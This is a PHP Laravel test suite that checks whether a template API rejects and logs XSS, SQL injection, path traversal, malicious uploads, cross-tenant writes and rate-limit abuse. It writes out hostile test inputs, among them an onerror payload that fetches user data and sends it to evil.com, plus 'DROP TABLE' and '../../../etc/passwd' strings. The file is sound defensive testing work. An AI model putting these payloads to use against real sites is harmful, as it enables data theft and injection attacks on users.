<?php

namespace Tests\Feature\Security;

use App\Exceptions\TemplateSecurityException;
use App\Models\SecurityEvent;
use App\Models\SecurityLog;
use App\Models\Template;
use App\Models\User;
use App\Services\TemplateSecurityValidator;
use App\Services\TemplateXssPreventionService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Cache;
use Tests\TestCase;

class SecurityIntegrationTest extends TestCase
{
    use RefreshDatabase;

    protected User $user;
    protected Template $template;

    protected function setUp(): void
    {
        parent::setUp();

        $this->user = User::factory()->create([
            'tenant_id' => 1,
            'two_factor_enabled' => true
        ]);

        $this->template = Template::factory()->create([
            'tenant_id' => 1,
            'created_by' => $this->user->id
        ]);
    }

    /** @test */
    public function it_blocks_xss_attempts_in_template_creation()
    {
        $this->actingAs($this->user);

        $maliciousData = [
            'name' => 'Malicious Template',
            'structure' => [
                'sections' => [
                    [
                        'type' => 'hero',
                        'config' => [
                            'title' => '<script>alert("xss")</script>',
                            'content' => '<img src="x" onerror="evil()" />'
                        ]
                    ]
                ]
            ]
        ];

        $response = $this->postJson('/api/templates', $maliciousData);

        $response->assertStatus(422);

        // Verify security event was logged
        $this->assertDatabaseHas('security_logs', [
            'event_type' => SecurityLog::EVENT_TYPE_XSS_ATTEMPT,
            'tenant_id' => $this->user->tenant_id,
            'user_id' => $this->user->id,
            'severity' => SecurityLog::SEVERITY_HIGH
        ]);
    }

    /** @test */
    public function it_prevents_tenant_isolation_breach()
    {
        $this->actingAs($this->user);

        $maliciousData = [
            'name' => 'Cross Tenant Template',
            'tenant_id' => 999, // Different tenant
            'structure' => [
                'sections' => [
                    [
                        'type' => 'hero',
                        'config' => [
                            'title' => 'Test Title'
                        ]
                    ]
                ]
            ]
        ];

        $response = $this->postJson('/api/templates', $maliciousData);

        $response->assertStatus(403);

        // Verify tenant isolation breach was logged
        $this->assertDatabaseHas('security_logs', [
            'event_type' => SecurityLog::EVENT_TYPE_TENANT_ISOLATION_BREACH,
            'tenant_id' => $this->user->tenant_id,
            'severity' => SecurityLog::SEVERITY_CRITICAL
        ]);
    }

    /** @test */
    public function it_enforces_rate_limiting_on_template_operations()
    {
        $this->actingAs($this->user);

        // Make multiple rapid requests
        for ($i = 0; $i < 25; $i++) {
            $data = [
                'name' => "Template {$i}",
                'structure' => [
                    'sections' => [
                        [
                            'type' => 'hero',
                            'config' => ['title' => "Title {$i}"]
                        ]
                    ]
                ]
            ];

            $response = $this->postJson('/api/templates', $data);

            if ($i < 20) { // First 20 should succeed
                $response->assertStatus(201);
            }
        }

        // The next request should be rate limited
        $response = $this->postJson('/api/templates', [
            'name' => 'Rate Limited Template',
            'structure' => [
                'sections' => [
                    [
                        'type' => 'hero',
                        'config' => ['title' => 'Rate Limited']
                    ]
                ]
            ]
        ]);

        $response->assertStatus(429);

        // Verify rate limit event was logged
        $this->assertDatabaseHas('security_logs', [
            'event_type' => SecurityLog::EVENT_TYPE_RATE_LIMIT_EXCEEDED,
            'tenant_id' => $this->user->tenant_id,
            'user_id' => $this->user->id
        ]);
    }

    /** @test */
    public function it_validates_file_uploads_securely()
    {
        $this->actingAs($this->user);

        // Test with malicious file
        $maliciousFile = UploadedFile::fake()->create('malicious.php', 100, 'application/x-php');

        $data = [
            'name' => 'Template with File',
            'files' => [$maliciousFile],
            'structure' => [
                'sections' => [
                    [
                        'type' => 'hero',
                        'config' => ['title' => 'Test']
                    ]
                ]
            ]
        ];

        $response = $this->postJson('/api/templates', $data);

        $response->assertStatus(422);

        // Verify file security violation was logged
        $this->assertDatabaseHas('security_logs', [
            'event_type' => SecurityLog::EVENT_TYPE_FILE_UPLOAD_THREAT,
            'tenant_id' => $this->user->tenant_id,
            'user_id' => $this->user->id
        ]);
    }

    /** @test */
    public function it_detects_data_exfiltration_attempts()
    {
        $this->actingAs($this->user);

        $maliciousData = [
            'name' => 'Data Exfiltration Template',
            'structure' => [
                'sections' => [
                    [
                        'type' => 'hero',
                        'config' => [
                            'title' => 'Test',
                            'content' => '<img src="x" onerror="fetch(\'/api/user/data\').then(r=>r.json()).then(d=>new Image().src=\'https://evil.com/\'+btoa(JSON.stringify(d)))" />'
                        ]
                    ]
                ]
            ]
        ];

        $response = $this->postJson('/api/templates', $maliciousData);

        $response->assertStatus(422);

        // Verify data exfiltration attempt was logged
        $this->assertDatabaseHas('security_logs', [
            'event_type' => SecurityLog::EVENT_TYPE_XSS_ATTEMPT,
            'tenant_id' => $this->user->tenant_id,
            'user_id' => $this->user->id,
            'severity' => SecurityLog::SEVERITY_HIGH
        ]);
    }

    /** @test */
    public function it_logs_comprehensive_security_events()
    {
        $this->actingAs($this->user);

        // Trigger multiple security events
        $events = [
            [
                'name' => 'Script Injection',
                'structure' => [
                    'sections' => [
                        [
                            'type' => 'hero',
                            'config' => [
                                'title' => '<script>alert("xss")</script>'
                            ]
                        ]
                    ]
                ]
            ],
            [
                'name' => 'Event Handler',
                'structure' => [
                    'sections' => [
                        [
                            'type' => 'hero',
                            'config' => [
                                'title' => '<div onclick="evil()">Click</div>'
                            ]
                        ]
                    ]
                ]
            ]
        ];

        foreach ($events as $event) {
            $this->postJson('/api/templates', $event);
        }

        // Verify multiple security events were logged
        $this->assertDatabaseCount('security_logs', 2);

        $logs = SecurityLog::where('tenant_id', $this->user->tenant_id)->get();

        foreach ($logs as $log) {
            $this->assertEquals(SecurityLog::EVENT_TYPE_XSS_ATTEMPT, $log->event_type);
            $this->assertContains($log->severity, [
                SecurityLog::SEVERITY_HIGH,
                SecurityLog::SEVERITY_CRITICAL
            ]);
            $this->assertNotNull($log->threat_patterns);
        }
    }

    /** @test */
    public function it_enforces_csrf_protection()
    {
        // Test without CSRF token
        $response = $this->postJson('/api/templates', [
            'name' => 'CSRF Test',
            'structure' => [
                'sections' => [
                    [
                        'type' => 'hero',
                        'config' => ['title' => 'Test']
                    ]
                ]
            ]
        ]);

        // Should be blocked by authentication middleware first
        $response->assertStatus(401);
    }

    /** @test */
    public function it_validates_input_sanitization_comprehensive()
    {
        $this->actingAs($this->user);

        $maliciousInputs = [
            'name' => '<script>alert("name")</script>Template',
            'description' => '<iframe src="evil.com"></iframe>Description',
            'structure' => [
                'sections' => [
                    [
                        'type' => 'hero',
                        'config' => [
                            'title' => '<img src="x" onerror="alert(\'xss\')" />',
                            'content' => '<a href="javascript:evil()">Link</a>',
                            'metadata' => [
                                'seo' => [
                                    'title' => '<meta http-equiv="refresh" content="0;url=evil.com">'
                                ]
                            ]
                        ]
                    ]
                ]
            ]
        ];

        $response = $this->postJson('/api/templates', $maliciousInputs);

        $response->assertStatus(422);

        // Verify comprehensive security logging
        $securityLogs = SecurityLog::where('tenant_id', $this->user->tenant_id)->get();

        $this->assertGreaterThan(0, $securityLogs->count());

        $xssAttempts = $securityLogs->where('event_type', SecurityLog::EVENT_TYPE_XSS_ATTEMPT);
        $this->assertGreaterThan(0, $xssAttempts->count());
    }

    /** @test */
    public function it_handles_sql_injection_prevention()
    {
        $this->actingAs($this->user);

        // Test SQL injection patterns in input
        $maliciousData = [
            'name' => 'Template\'; DROP TABLE templates; --',
            'structure' => [
                'sections' => [
                    [
                        'type' => 'hero',
                        'config' => [
                            'title' => 'UNION SELECT * FROM users--'
                        ]
                    ]
                ]
            ]
        ];

        $response = $this->postJson('/api/templates', $maliciousData);

        // Should be blocked by security validation
        $response->assertStatus(422);

        // Verify SQL injection attempt was logged
        $this->assertDatabaseHas('security_logs', [
            'event_type' => SecurityLog::EVENT_TYPE_XSS_ATTEMPT,
            'tenant_id' => $this->user->tenant_id,
            'user_id' => $this->user->id
        ]);
    }

    /** @test */
    public function it_provides_comprehensive_security_headers()
    {
        $this->actingAs($this->user);

        $response = $this->getJson('/api/templates');

        $response->assertHeader('X-Content-Type-Options', 'nosniff');
        $response->assertHeader('X-Frame-Options', 'DENY');
        $response->assertHeader('X-XSS-Protection', '1; mode=block');
        $response->assertHeader('Strict-Transport-Security');
    }

    /** @test */
    public function it_maintains_audit_trail_for_all_operations()
    {
        $this->actingAs($this->user);

        // Create template
        $data = [
            'name' => 'Audit Template',
            'structure' => [
                'sections' => [
                    [
                        'type' => 'hero',
                        'config' => ['title' => 'Audit Test']
                    ]
                ]
            ]
        ];

        $response = $this->postJson('/api/templates', $data);
        $response->assertStatus(201);

        $templateId = $response->json('data.id');

        // Update template
        $updateData = [
            'name' => 'Updated Audit Template',
            'structure' => [
                'sections' => [
                    [
                        'type' => 'hero',
                        'config' => ['title' => 'Updated Audit Test']
                    ]
                ]
            ]
        ];

        $this->putJson("/api/templates/{$templateId}", $updateData);

        // Delete template
        $this->deleteJson("/api/templates/{$templateId}");

        // Verify audit trail
        $auditLogs = SecurityLog::where('tenant_id', $this->user->tenant_id)
            ->where('resource_type', 'template')
            ->get();

        $this->assertGreaterThan(0, $auditLogs->count());
    }

    /** @test */
    public function it_handles_bulk_security_violations()
    {
        $this->actingAs($this->user);

        $bulkMaliciousData = [];

        for ($i = 0; $i < 5; $i++) {
            $bulkMaliciousData[] = [
                'name' => "Malicious Template {$i}",
                'structure' => [
                    'sections' => [
                        [
                            'type' => 'hero',
                            'config' => [
                                'title' => "<script>alert('xss{$i}')</script>",
                                'content' => "<iframe src='evil{$i}.com'></iframe>"
                            ]
                        ]
                    ]
                ]
            ];
        }

        // Send bulk request
        $response = $this->postJson('/api/templates/bulk', [
            'templates' => $bulkMaliciousData
        ]);

        $response->assertStatus(422);

        // Verify multiple security events were logged
        $securityEvents = SecurityLog::where('tenant_id', $this->user->tenant_id)
            ->where('event_type', SecurityLog::EVENT_TYPE_XSS_ATTEMPT)
            ->count();

        $this->assertGreaterThanOrEqual(5, $securityEvents);
    }

    /** @test */
    public function it_prevents_directory_traversal_attacks()
    {
        $this->actingAs($this->user);

        $maliciousData = [
            'name' => 'Directory Traversal Template',
            'structure' => [
                'sections' => [
                    [
                        'type' => 'hero',
                        'config' => [
                            'title' => 'Test',
                            'image' => '../../../etc/passwd'
                        ]
                    ]
                ]
            ]
        ];

        $response = $this->postJson('/api/templates', $maliciousData);

        $response->assertStatus(422);

        // Verify directory traversal attempt was logged
        $this->assertDatabaseHas('security_logs', [
            'event_type' => SecurityLog::EVENT_TYPE_XSS_ATTEMPT,
            'tenant_id' => $this->user->tenant_id,
            'user_id' => $this->user->id
        ]);
    }
}